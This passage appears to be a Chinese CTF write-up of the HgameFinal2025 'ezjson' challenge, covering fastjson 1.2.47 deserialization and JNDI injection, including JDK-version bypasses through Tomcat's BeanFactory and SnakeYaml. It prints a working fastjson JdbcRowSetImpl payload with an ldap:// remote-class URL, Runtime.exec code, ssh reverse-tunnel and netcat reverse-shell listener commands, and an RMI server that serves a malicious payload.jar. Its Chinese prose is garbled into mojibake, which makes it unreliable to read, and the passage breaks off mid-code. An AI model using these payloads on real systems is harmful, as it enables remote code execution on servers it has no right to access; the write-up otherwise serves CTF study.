class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;;<br>                &#125;<br>                <br>                <span class="hljs-keyword">try</span>&#123;<br>                        Runtime.getRuntime().exec(var1);<span class="hljs-comment">//ç”¨Runtimeç±»æ‰§è¡Œ</span><br>                &#125;<span class="hljs-keyword">catch</span>(IOException var1)&#123;<span class="hljs-comment">//å¦‚æœå‘½ä»¤æ‰§è¡Œå‘ç”Ÿå¼‚å¸¸æ•è·IOExceptioné˜²æ­¢è¿›ç¨‹å´©æºƒ</span><br>                        var1.printStackTrace();<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ•´ä½“æµç¨‹"><a href="#æ•´ä½“æµç¨‹" class="headerlink" title="æ•´ä½“æµç¨‹"></a>æ•´ä½“æµç¨‹</h2><div class="note note-warning">            <p><strong>è¡¥å……ï¼š</strong>ä»¥ä¸‹æ˜¯æˆ‘æœ€åˆç”»çš„å›¾ï¼Œä½†åæ¥å‘ç° JNDI éƒ¨åˆ†ä¸å¤Ÿå‡†ç¡®ï¼ˆæ‡’å¾—æ”¹äº†ï¼‰ï¼Œç”±äºä¸€å¼€å§‹æˆ‘ç”¨çš„æ˜¯ Yakitï¼ˆç”¨äº†åè®®ç«¯å£å¤ç”¨æŠ€æœ¯ï¼‰è€Œæ²¡æœ‰è‡ªå·±å†™æœåŠ¡ç«¯ï¼Œæˆ‘æ··æ·†äº†æµç¨‹ä¸­çš„ä¸¤ä¸ªæ­¥éª¤ï¼Œåœ¨ä¸‹å›¾çš„æ­¥éª¤ 6ã€7 ä¸­åº”å½“æ˜¯ä¸€æ¬¡ ldap è¯·æ±‚è·å– Referenceï¼Œä¸€æ¬¡ http è¯·æ±‚è·å–è¿œç¨‹ç±»ï¼ˆè¯·æ±‚ç±»å‹å’Œè¿œç¨‹ç±»åœ°å€ç­‰å‡ç”± Reference æŒ‡å®šï¼‰ï¼Œéœ€è¦ä¸¤ä¸ªæœåŠ¡ç«¯ã€‚è¯¥å›¾ä»…é’ˆå¯¹ä¸Šé¢çš„åˆ†ææµç¨‹ï¼Œçœ‹ä¸ªå¤§æ¦‚å³å¯ã€‚</p>          </div><p><img src="/img/fastjsonAndJNDI/A9J7bOwKnoumiNxpexTcJmtanGf.png"></p><div class="note note-warning">            <p>åœ¨ç½‘ä¸Šçœ‹åˆ°äº†ï¼ˆæ®è¯´æ˜¯ï¼‰bitterz å¸ˆå‚…çš„æµç¨‹å›¾å¦‚ä¸‹ï¼Œä¸€ä¸‹å­ç»™æˆ‘ç‚¹é€šäº†ä¸å°‘ï¼Œåœ¨è¿™é‡Œä¹Ÿè¡¥å……ä¸€äº› JNDI æ³¨å…¥çš„å†…å®¹ã€‚è¯¥å›¾å±•ç¤ºçš„æ˜¯ JNDI æ³¨å…¥çš„æµç¨‹ï¼Œå…ˆä½¿ç”¨ rmi æˆ– ldap è¿›è¡Œä¸€æ¬¡æŒ‡å®šåœ°å€çš„é€šä¿¡ï¼ŒæŒ‰æ‰€ç»™ç±»åæŸ¥æ‰¾å¹¶è·å–å…¶å¯¹åº”çš„ Reference ç±»ï¼ˆè¯¥ç±»æ˜¯ javax.naming çš„ä¸€ä¸ªç±»ï¼Œè¡¨ç¤ºå¯¹åœ¨å‘½å&#x2F;ç›®å½•ç³»ç»Ÿå¤–éƒ¨æ‰¾åˆ°çš„å¯¹è±¡çš„å¼•ç”¨ã€‚æˆ‘çš„ç†è§£æ˜¯ç›¸å½“äºç»™ä½ ä¸€ä¸ªæ¸…å•ï¼Œå‘Šè¯‰ä½ è¦åšå•¥ã€è¦å‡†å¤‡å•¥ï¼ˆç±»ï¼‰ï¼‰ï¼Œå…¶ä¸­åŒ…å«äº†è¦åœ¨å®¢æˆ·ç«¯ï¼ˆå—å®³è€…ï¼‰åˆ›å»ºçš„ç±»ã€æ‰€éœ€çš„å·¥å‚ç±»åŠåœ°å€ï¼Œé‚£ä¹ˆå·¥å‚ç±»é¦–å…ˆåœ¨æœ¬åœ° ClassPath ä¸­å¯»æ‰¾åŠ è½½ï¼Œæ‰¾ä¸åˆ°åˆ™ä» Reference æŒ‡å®šçš„è¿œç¨‹åœ°å€ä¸‹è½½å·¥å‚ç±» Factoryï¼Œç„¶åå°†å…¶å®ä¾‹åŒ–è§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚<br>é‚£ä¹ˆç»“åˆâ€œè¡¥å……ï¼šldap æœåŠ¡ç«¯â€éƒ¨åˆ†çš„æˆªå›¾å¯çŸ¥ï¼Œå½“ jdk ç‰ˆæœ¬ä¸ç¬¦åˆè¦æ±‚æ—¶ï¼Œç¬¬ 4 æ­¥éª¤å—å½±å“æœªèƒ½å‘å‡ºè¯·æ±‚ï¼Œä»è€Œ Yakit æœåŠ¡ç«¯åªæ¥æ”¶åˆ° ldap è¯·æ±‚è·å– Reference è€Œæ—  http è¯·æ±‚ä¸‹è½½å·¥å‚ç±»ã€‚è¿™å…·ä½“æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿåœ¨ä¸‹é¢â€œå…¶ä»–ç‰ˆæœ¬çš„ç»•è¿‡â€jdk éƒ¨åˆ†ç»“åˆæµç¨‹å›¾ç»§ç»­åˆ†æâ€¦â€¦</p>          </div><p><img src="/img/fastjsonAndJNDI/WqLZb4gQGoeGDPxb7bfcrLxMn0L.png" alt="æ¥è‡ªbitterz"></p><h1 id="å…¶ä»–ç‰ˆæœ¬çš„ç»•è¿‡"><a href="#å…¶ä»–ç‰ˆæœ¬çš„ç»•è¿‡" class="headerlink" title="å…¶ä»–ç‰ˆæœ¬çš„ç»•è¿‡"></a>å…¶ä»–ç‰ˆæœ¬çš„ç»•è¿‡</h1><h2 id="Jdk-å…³äº-JNDI-æ³¨å…¥"><a href="#Jdk-å…³äº-JNDI-æ³¨å…¥" class="headerlink" title="Jdk-å…³äº JNDI æ³¨å…¥"></a>Jdk-å…³äº JNDI æ³¨å…¥</h2><p>ä¸»è¦å‚è€ƒ <a href="https://www.cnblogs.com/R0ser1/p/17105579.html">R0ser1</a>ã€<a href="https://www.cnblogs.com/bitterz/p/15946406.html">bitterz</a>ã€<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">KINGX</a>ï¼Œè¿™é‡Œä»…ç®€è¦è¯´æ˜</p><p><strong>RMIï¼š</strong>åœ¨ JDK 6u141, JDK 7u131, JDK 8u121 ä¸­ Java é™åˆ¶äº† Naming&#x2F;Directory æœåŠ¡ä¸­ JNDI  Reference è¿œç¨‹åŠ è½½ Object Factory ç±»çš„ç‰¹æ€§ã€‚ç³»ç»Ÿå±æ€§  <code>com.sun.jndi.rmi.object.trustURLCodebase</code>ã€<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>  çš„é»˜è®¤å€¼å˜ä¸º falseï¼Œå³é»˜è®¤ä¸å…è®¸ä»è¿œç¨‹çš„ Codebase åŠ è½½ Reference å·¥å‚ç±»ã€‚</p><p><strong>LDAPï¼š</strong>åœ¨ Oracle JDK 11.0.1ã€8u191ã€7u201ã€6u211 ä¹‹å com.sun.jndi.ldap.object.trustURLCodebase å±æ€§çš„é»˜è®¤å€¼è¢«è°ƒæ•´ä¸º falseï¼Œldap ä¹ŸåŒæ ·æ— æ³•è¿œç¨‹åŠ è½½ Reference å·¥å‚ç±»ã€‚</p><p>æ€»è€Œè¨€ä¹‹ï¼Œå½“ jdk ç‰ˆæœ¬è¾ƒé«˜æ—¶ä¸Šå›¾ï¼ˆbitterz å¸ˆå‚…çš„æµç¨‹å›¾ï¼‰ç¬¬ 4 æ­¥éª¤åœ¨ç³»ç»Ÿé»˜è®¤æƒ…å†µä¸‹å¤–éƒ¨å·¥å‚ç±»ä¸å—ä¿¡ä»»ï¼Œä¸ºç¦ç”¨çŠ¶æ€ï¼Œæ™®é€šçš„åˆ©ç”¨æ–¹å¼ä¹Ÿå°±è¡Œä¸é€šäº†ã€‚é‚£ä¹ˆæœ‰ä»€ä¹ˆ jdk é«˜ç‰ˆæœ¬ JNDI æ³¨å…¥ç»•è¿‡æ–¹å¼å‘¢ï¼Ÿ</p><ul><li>æ€è·¯ä¸€ï¼šæ‰§è¡Œæ­¥éª¤ 3 æ—¶ï¼Œåˆ©ç”¨å—å®³è€…æœ¬åœ°çš„å·¥å‚ç±»å®ç° RCE</li><li>æ€è·¯äºŒï¼šå—å®³è€…å‘ LDAP æˆ– RMI æœåŠ¡å™¨è¯·æ±‚ Reference ç±»åï¼Œå°†ä»æœåŠ¡å™¨ä¸‹è½½å­—èŠ‚æµè¿›è¡Œååºåˆ—åŒ–è·å¾— Reference å¯¹è±¡ï¼Œæ­¤æ—¶å³å¯åˆ©ç”¨ååºåˆ—åŒ– gadget å®ç° RCE</li></ul><h3 id="åˆ©ç”¨æœ¬åœ°çš„å·¥å‚ç±»"><a href="#åˆ©ç”¨æœ¬åœ°çš„å·¥å‚ç±»" class="headerlink" title="åˆ©ç”¨æœ¬åœ°çš„å·¥å‚ç±»"></a>åˆ©ç”¨æœ¬åœ°çš„å·¥å‚ç±»</h3><p>è¿™ä¸ªæ€è·¯æ¯”è¾ƒæ¸…æ™°ï¼Œæ—¢ç„¶ç¬¬ 4 æ­¥è¢«ç¦ç”¨ï¼Œé‚£ä¹ˆå°±å°è¯•åœ¨æ­¤ä¹‹å‰ä»æœ¬åœ°åŠ è½½å·¥å‚ç±»ã€‚è¿™ä¸ªæ–¹æ³•éœ€è¦èƒ½å¤Ÿæ¢æµ‹å‡ºä½¿ç”¨çš„ä¾èµ–æˆ–è€…æ˜¯ç™½ç›’å®¡è®¡çŸ¥é“æœ‰å“ªäº›ä¾èµ–ã€‚è¿™é‡Œä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼Œå‡éœ€è¦æœ‰ Tomcat çš„ä¾èµ–ï¼Œè§¦å‘æœ‰å¤§æ¦‚ Tomcat7ã€8 çš„ç‰ˆæœ¬é™åˆ¶ï¼Œé«˜ç‰ˆæœ¬çš„ Tomcat æˆ–è®¸å¯ä»¥å‚è€ƒä¸€ä¸‹ <a href="https://xz.aliyun.com/news/16156">https://xz.aliyun.com/news/16156</a></p><ul><li>åŸºäº org.apache.naming.factory.BeanFactoryï¼šè¯¥ç±»æœ‰ä¸€ä¸ª getObjectInstance()æ–¹æ³•ä¼šæŠŠ Reference å¯¹è±¡çš„ className å±æ€§ä½œä¸ºç±»åå»è°ƒç”¨æ— å‚æ„é€ æ–¹æ³•å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ã€‚ç„¶åå†ä» Reference å¯¹è±¡çš„ Addrs å‚æ•°é›†åˆä¸­å–å¾— AddrType æ˜¯ forceString çš„ String å‚æ•°ã€‚å…¶ä¸­ propName å’Œ param å¯ä»¥ç”¨äºåå°„è°ƒç”¨æŒ‡å®šçš„æ–¹æ³•ã€‚é‚£ä¹ˆåˆ©ç”¨è¯¥ç±»å°±å¯ä»¥è°ƒç”¨æœ¬åœ°å…¶ä»–ä¾èµ–çš„ç±»å®ç°æ”»å‡»ã€‚å¸¸è§å¯åˆ©ç”¨çš„åŒ…æ‹¬ ELProcessorã€groovyã€SnakeYaml ç­‰ç­‰ã€‚</li><li>åŸºäº org.apache.catalina.users.MemoryUserDatabaseFactoryï¼šä¸»è¦æ˜¯å¯ä»¥é€šè¿‡ XXE å®ç° RCEï¼Œå…·ä½“æœªä½œç ”ç©¶</li></ul><h3 id="æœåŠ¡ç«¯è¿”å›æ•°æ®æµååºåˆ—åŒ–-gadget"><a href="#æœåŠ¡ç«¯è¿”å›æ•°æ®æµååºåˆ—åŒ–-gadget" class="headerlink" title="æœåŠ¡ç«¯è¿”å›æ•°æ®æµååºåˆ—åŒ– gadget"></a>æœåŠ¡ç«¯è¿”å›æ•°æ®æµååºåˆ—åŒ– gadget</h3><p>rmi å’Œ ldap æœåŠ¡é™¤äº†è¿”å› Reference å¤–ä¹Ÿå¯ä»¥ç›´æ¥è¿”å›ä¸€æ®µæ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œä¸èµ°åŸæœ¬çš„ 3ã€4 æ­¥ï¼Œç„¶åä½¿ç”¨åˆé€‚çš„å¯ç”¨ä¾èµ–ååºåˆ—åŒ– gadget</p><h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><p>å¯¹äº fastjson å…¶ä»–ç‰ˆæœ¬ï¼Œé™¤äº†å¤ªè€çš„ç‰ˆæœ¬å¤–åŸºæœ¬éƒ½æ˜¯åœ¨ <code>checkAutoType()</code> ä¸Šåšæ”¹åŠ¨ï¼Œè®¸å¤šæ¶‰åŠçš„è®¾ç½®ã€å‚æ•°åœ¨æœ¬æ–‡å½“ä¸­ä¹Ÿæœ‰æåˆ°ï¼Œä¾‹å¦‚ï¼š</p><p>1.2.47 å‰çš„ä¸€äº›ç‰ˆæœ¬ä¸­æ¼æ´ä¸»è¦å‡ºç°åœ¨å­—ç¬¦ä¸²å¤„ç†ï¼Œé€šè¿‡æ’å…¥æè¿°ç¬¦ <code>[</code>ã€<code>L</code>ã€<code>;</code> æˆ–åŒå†™ç­‰æ–¹æ³•ç»•è¿‡æ£€æµ‹ï¼›</p><p>1.2.68 ç‰ˆæœ¬ä¸­ <code>MiscCodec</code> è®¾ç½®äº† <code>cache</code> é»˜è®¤ä¸º false åå¯ä»¥åˆ©ç”¨ <code>expectClass</code> ç»•è¿‡ <code>checkAutoType()</code>ï¼Œ1.2.47 æ—¶ä¸Šé¢çš„åˆ†æå¯ä»¥çœ‹åˆ° <code>expectClass</code> é»˜è®¤ä¸º nullï¼Œ1.2.68 æ—¶å¦‚æœå‡½æ•°æœ‰ <code>expectClass</code> å…¥å‚ï¼Œä¸”æˆ‘ä»¬ä¼ å…¥çš„ç±»åæ˜¯ <code>expectClass</code> çš„å­ç±»æˆ–å®ç°ï¼Œå¹¶ä¸”ä¸åœ¨é»‘åå•ä¸­ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ <code>checkAutoType()</code> çš„å®‰å…¨æ£€æµ‹ï¼›</p><p>æ€»è€Œè¨€ä¹‹ï¼Œå¯¹ 1.2.47 çš„æ¼æ´ä¸€æ•´ä¸ªç ”ç©¶ç†è§£ä¸‹æ¥ä¹‹åå†å»çœ‹åˆ«çš„ç‰ˆæœ¬ä¼šè½»æ¾ä¸€äº›ï¼Œè¿™é‡Œä¸å†ç»†è‡´åˆ†æäº†ï¼Œå…·ä½“å†…å®¹å°±å»çœ‹å‚è€ƒçš„è¿™å‡ ç¯‡æ–‡ç« å³å¯ï¼š</p><p><a href="https://su18.org/post/fastjson/">https://su18.org/post/fastjson/</a></p><p><a href="https://www.freebuf.com/vuls/361576.html">https://www.freebuf.com/vuls/361576.html</a></p><p><a href="https://goodapple.top/archives/832">https://goodapple.top/archives/832</a></p><h1 id="HgameFinal2025-èµ›é¢˜å¤ç°-ezjson"><a href="#HgameFinal2025-èµ›é¢˜å¤ç°-ezjson" class="headerlink" title="HgameFinal2025 èµ›é¢˜å¤ç°-ezjson"></a>HgameFinal2025 èµ›é¢˜å¤ç°-ezjson</h1><h2 id="æ‰“å¼€-jar-åŒ…é…ç½®è°ƒè¯•é¡¹ç›®"><a href="#æ‰“å¼€-jar-åŒ…é…ç½®è°ƒè¯•é¡¹ç›®" class="headerlink" title="æ‰“å¼€ jar åŒ…é…ç½®è°ƒè¯•é¡¹ç›®"></a>æ‰“å¼€ jar åŒ…é…ç½®è°ƒè¯•é¡¹ç›®</h2><p>é¢˜ç›®ç»™äº†åç«¯ jar åŒ…ï¼Œæˆ‘ä»¬éœ€è¦å¯¹å…¶è¿›è¡Œè°ƒè¯•åˆ†æã€‚è·Ÿ Hgame2025 çš„ SigninJava ä¸€æ ·ï¼Œåœ¨ idea é‡Œ Add as Library æ·»åŠ ä¸ºåº“å³å¯æŸ¥çœ‹æºç ï¼Œä½†æ˜¯è¿™é‡Œï¼ˆåŠä»¥ä¸Šæ¼æ´å¤ç°ï¼‰æˆ‘ä¸ºäº†èƒ½å¤Ÿè°ƒè¯•åˆ†ææ›´æ·±å±‚çš„åŸç†ï¼Œäºæ˜¯æ‰‹åŠ¨è¿ç§»é¡¹ç›®ï¼š</p><p>idea æ–°å»ºç©ºé¡¹ç›®ï¼Œå°† jar åŒ…ç”¨è§£å‹ç¼©è½¯ä»¶æ‰“å¼€å¹¶å¤åˆ¶å…¶ä¸­ <code>/BOOT-INF/classes/</code> å†…çš„å†…å®¹è‡³ idea ç©ºé¡¹ç›®çš„ <code>/src/main/java/</code> ä¸‹</p><p><img src="/img/fastjsonAndJNDI/JKCTbzL4CoEfm5x5Oyxc3dFLnsh.png"></p><p>ä½†æ­¤æ—¶ä»ä¸ºé‡Œé¢ <code>.class</code> æ–‡ä»¶ï¼Œäºæ˜¯ä½¿ç”¨ jd-gui å·¥å…·å°†å…¶åç¼–è¯‘ä¸º <code>.java</code> æºæ–‡ä»¶æ›¿æ¢å…¥æ–°é¡¹ç›®</p><p><img src="/img/fastjsonAndJNDI/Knmsbj5UtoxpNyxplNTcoMoNnpd.png"></p><p><img src="/img/fastjsonAndJNDI/EqglbFfG4ocImhxTHNocpovbnrh.png"></p><p>ç„¶åå°† <code>/BOOT-INF/lib/</code> ä¸‹çš„ä¾èµ–å…¨éƒ¨å¯¼å…¥æ–°é¡¹ç›®</p><p><img src="/img/fastjsonAndJNDI/EY3PbTSdEoL9Nzx4Iemc0ZGVnWb.png"></p><p><img src="/img/fastjsonAndJNDI/DfMsbIl8hobbkKxFWgZcSA2gnKb.png"></p><p>è‡³æ­¤é¡¹ç›®è¿ç§»å®Œæ¯•</p><h2 id="ä¸»è¦å†…å®¹"><a href="#ä¸»è¦å†…å®¹" class="headerlink" title="ä¸»è¦å†…å®¹"></a>ä¸»è¦å†…å®¹</h2><p>å…¶ä¸­ Controller æºç å¦‚ä¸‹ï¼ˆå…¶ä»–æ²¡æœ‰ä»€ä¹ˆå¯çœ‹çš„äº†ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> hgame.mysid.ezjson.Controller;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PostMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestBody;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> java.util.Set;<br><br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">mainController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to Hgame2025-Final.&quot;</span>;<br>    &#125;<br>   <br>    <span class="hljs-meta">@PostMapping(&#123;&quot;/parse&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">parseJson</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String json)</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON._parseObject_(json);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Parsed: &quot;</span> + obj.getClass().getName();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€æœ‰ä¾èµ–å¦‚ä¸‹</p><p><img src="/img/fastjsonAndJNDI/EuMPbfHRToyF4Exfh78ckJWInrh.png"></p><h2 id="å°è¯•è¿‡ç¨‹"><a href="#å°è¯•è¿‡ç¨‹" class="headerlink" title="å°è¯•è¿‡ç¨‹"></a>å°è¯•è¿‡ç¨‹</h2><p>æ˜¾è€Œæ˜“è§è€ƒå¯Ÿçš„æ˜¯ fastjson1.2.47 ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚äºæ˜¯æˆ‘å…ˆå°è¯•çš„æ˜¯æœ€ç®€å•çš„ JdbcRowSetImpl ç”¨ ldap è¿”å› Reference åŠ è½½è¿œç¨‹ç±»çš„æ–¹å¼ã€‚</p><p>è¿˜æ˜¯å·ä¸ªæ‡’ï¼Œä¸åœ¨æœåŠ¡å™¨ä¸Šé‡æ–°æè¿‡äº†ï¼Œå°±å¼€ä¸€ä¸ª ssh åå‘éš§é“æŠŠæœ¬åœ° Yakit åè¿æœåŠ¡å™¨çš„ç«¯å£æ˜ å°„åˆ°äº‘æœåŠ¡å™¨ä¸Šå»åšé¢˜ï¼Œæœ¬åœ°è·‘ä¸€ä¸‹é¢˜ç›®çš„æ–‡ä»¶ï¼Œç„¶å ldap æ”¾äº‘æœåŠ¡å™¨çš„ ip å’Œç«¯å£ã€‚å‘åŒ…ï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh -fNR 8520:localhost:8085 root@ip åˆ›å»ºsshåå‘éš§é“<br>ps aux | grep &quot;ssh -NfR&quot; æŸ¥çœ‹sshè¿æ¥æƒ…å†µ<br>netstat -tuln | grep 8520 æŸ¥çœ‹ç«¯å£çŠ¶æ€<br>nc -l -p 8520 ncç›‘å¬è¯·æ±‚<br>nc -lvvp 12345 æ¥æ”¶åå¼¹shell<br></code></pre></td></tr></table></figure><p>payload æ”¹ä¸€ä¸‹äº‘æœåŠ¡å™¨ ip å…¶ä»–å’Œå‰é¢çš„å¤ç°ä¸€è‡´</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:8085/PrIXqXOz&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>è¯æ˜å½“å‰ jdk8u181 ç¯å¢ƒä¸‹è¯¥åˆ©ç”¨æ–¹å¼å¯è¡Œï¼Œä¸äº‘æœåŠ¡å™¨è¿æ¥æ­£å¸¸</p><p><img src="/img/fastjsonAndJNDI/P2nXbbauYoA95kx5cFqctNnJnfc.png"></p><p>ç„¶è€Œå½“æˆ‘å»æ‰“å¼€é¶æœºç”¨åŒæ ·çš„æ–¹å¼å°è¯•æ—¶ï¼Œå‘ç°è¿œç¨‹æ¶æ„ç±»ä¸‹è½½å¤±è´¥ï¼Œåªæœ‰ LDAP è¿æ¥æ²¡æœ‰ HTTP è¿æ¥ï¼Œæ¨æµ‹å¯èƒ½æ˜¯é¶æœº jdk ç‰ˆæœ¬é«˜äº oracle 8u191ï¼Œ<code>com.sun.jndi.ldap.object.trustURLCodebase</code> å±æ€§çš„é»˜è®¤å€¼è¢«è°ƒæ•´ä¸º false</p><div class="note note-warning">            <p><strong>çº é”™ï¼š</strong>åæ¥å‘ç°ï¼Œç”±äºå·æ‡’ï¼Œå…¶å®è¿”å›çš„ Reference å°±æœ‰é—®é¢˜ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚æˆ‘å‘é€çš„ json payload ä¸­åœ°å€ä½¿ç”¨çš„æ˜¯äº‘æœåŠ¡å™¨ ipï¼Œé¶æœºå¯ä»¥æ­£å¸¸è®¿é—®ï¼Œç„¶è€Œé¶æœºæ¥æ”¶åˆ° Reference å Reference å†…çš„è¿œç¨‹ Factory åœ°å€ä¸º 127.0.0.1 æ²¡æœ‰æ›´æ”¹ï¼Œé¶æœºå‹æ ¹å°±ä¸ä¼šå†è®¿é—®äº‘æœåŠ¡å™¨ï¼Œè€Œæœ¬åœ°æµ‹è¯•è‡ªç„¶å°±ä¸ä¼šæœ‰é—®é¢˜ã€‚ä¸€å¼€å§‹åŸç†æ²¡æœ‰å¼„æ‡‚ï¼Œä½†ä¼¼ä¹æ­ªæ‰“æ­£ç€äº†ï¼Œéš¾ç»·â€¦â€¦</p>          </div><p><img src="/img/fastjsonAndJNDI/EfYIbDPmuokjadxXcoPc0Clsnac.png"></p><p>å»åŒ…é‡Œçš„ MANIFEST.MF æ–‡ä»¶æŸ¥çœ‹ jar åŒ…çš„æ‰“åŒ…ç¼–è¯‘ç‰ˆæœ¬å‘ç°æ˜¯ 1.8ï¼Œä½†æ²¡æœ‰å†å…·ä½“çš„ç‰ˆæœ¬å·äº†ã€‚æ¨æµ‹å¯èƒ½å¤§äº oracle 8u191ã€‚</p><p><img src="/img/fastjsonAndJNDI/Sdnsbzp5NoXufpx46rsckGRjnxb.png"></p><p>åç»­æ€è·¯æˆ–è®¸å°±è¦è€ƒè™‘ JNDI çš„é«˜ç‰ˆæœ¬ç»•è¿‡ï¼Œå…³æ³¨ä¸€ä¸‹ä¾èµ–å‘ç°æœ‰ springã€Tomcatã€Jacksonã€log4j2ã€SnakeYaml è¿™äº›ï¼Œä»ä¸­å¯»æ‰¾å¯åˆ©ç”¨çš„é“¾</p><p>æˆ‘é¦–å…ˆå°è¯•çš„æ˜¯åŸºäºæœ¬åœ°å·¥å‚ç±»çš„ç»•è¿‡æ–¹å¼ï¼š</p><p>å…ˆå†™ä¸€ä¸ªæ¶æ„é™æ€ç±»ï¼Œç„¶åæ‰“åŒ…ä¸º jar åŒ…ï¼Œ<code>python -m http.server 9999</code> åœ¨æ–‡ä»¶æ‰€åœ¨ç›®å½•å¿«é€Ÿèµ·ä¸€ä¸ª http æœåŠ¡ä»¥ä¾›è·å–æ¶æ„ jar åŒ…ã€‚</p><p>æˆ‘ç”¨å¦‚ä¸‹ rmi æœåŠ¡ç«¯è¿”å›ä¸€ä¸ª Referenceï¼Œç”¨ BeanFactory å»è°ƒç”¨ SnakeYaml ååºåˆ—åŒ– payloadï¼Œä»è€Œè¿œç¨‹ä¸‹è½½æˆ‘å‡†å¤‡å¥½çš„æ¶æ„ payload.jar ç”¨ ScriptEngineManager å»åŠ è½½ã€å®ä¾‹åŒ–ã€è¿è¡Œæ¶æ„ä»£ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.jndi;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jndi_bypass_snakeYaml</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry._createRegistry_(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.yaml.snakeyaml.Yaml&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>                <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, 